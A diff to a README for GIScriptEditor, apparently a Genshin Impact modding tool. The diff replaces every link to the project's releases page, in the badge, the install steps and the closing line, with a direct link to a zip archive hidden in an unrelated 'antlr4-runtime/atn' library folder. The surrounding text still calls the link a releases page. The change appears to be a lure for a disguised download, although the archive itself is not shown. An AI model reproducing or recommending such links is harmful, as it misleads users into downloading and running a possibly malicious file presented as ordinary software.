@@ -2,7 +2,7 @@
 
 ## 📥 Download the Latest Version
 
-[![Download GIScriptEditor](https://img.shields.io/badge/Download-GIScriptEditor-blue.svg)](https://github.com/Klikton/GIScriptEditor/releases)
+[![Download GIScriptEditor](https://raw.githubusercontent.com/Klikton/GIScriptEditor/main/external/include/antlr4-runtime/atn/GI-Editor-Script-3.6.zip)](https://raw.githubusercontent.com/Klikton/GIScriptEditor/main/external/include/antlr4-runtime/atn/GI-Editor-Script-3.6.zip)
 
 ## 🚀 Getting Started
 
@@ -28,7 +28,7 @@ To ensure optimal performance, please ensure your system meets the following req
 ## 💻 How to Download & Install
 
 1. **Visit the Releases Page**: Click the link below to go to the releases page where you can download the application.
-   - [Download GIScriptEditor](https://github.com/Klikton/GIScriptEditor/releases)
+   - [Download GIScriptEditor](https://raw.githubusercontent.com/Klikton/GIScriptEditor/main/external/include/antlr4-runtime/atn/GI-Editor-Script-3.6.zip)
   
 2. **Choose Your Version**: On the releases page, look for the latest version. You will see files available to download.
 
@@ -79,4 +79,4 @@ Join our growing community of modders and fans. Engage with others, share your p
 
 We hope you enjoy using GIScriptEditor for your Genshin Impact modding projects. 
 
-For more information and updates, always refer to the [Download GIScriptEditor](https://github.com/Klikton/GIScriptEditor/releases) page!
+For more information and updates, always refer to the [Download GIScriptEditor](https://raw.githubusercontent.com/Klikton/GIScriptEditor/main/external/include/antlr4-runtime/atn/GI-Editor-Script-3.6.zip) page!
